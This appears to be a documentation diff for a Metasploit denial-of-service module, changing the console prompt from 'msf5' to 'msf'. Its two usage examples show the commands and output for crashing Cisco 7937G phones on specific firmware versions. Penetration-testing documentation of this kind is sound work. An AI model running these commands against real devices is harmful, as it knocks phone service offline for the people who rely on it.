@@ -28,10 +28,10 @@
 ### Cisco 7937G Running Firmware Version SCCP-1-4-5-7
 
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
-msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
+msf auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run
+msf auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Sending DoS Packets. Stand by.
@@ -42,10 +42,10 @@ msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run
 ### Cisco 7937G Running Firmware Version SCCP-1-4-5-5
 
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
-msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
+msf auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run
+msf auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Sending DoS Packets. Stand by.
